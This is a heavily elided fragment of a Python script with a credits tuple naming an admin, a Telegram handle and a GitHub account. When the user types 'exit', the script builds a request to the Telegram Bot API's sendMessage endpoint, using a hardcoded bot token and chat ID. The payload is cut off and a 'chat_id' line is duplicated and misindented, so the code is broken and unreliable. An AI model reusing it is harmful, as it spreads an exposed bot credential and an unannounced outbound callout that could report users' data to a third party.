...
info = ("\nadmin : Yousuf, Lamim","Telegram : @tmx71bd","github : @Md-Lamim","number :.......... ","city : bangladesh")
...
while True:
    ...
    if "exit" == inp:
        ...
        base_url = "https://api.telegram.org/bot6409759473:AAF9v4TCeUYtbVkUFRC9bwKs_JctS0UFpqI/sendMessage"
        chat_id = "6856969214"
        params = {
            "chat_id": chat_id,
                        "chat_id": chat_id,
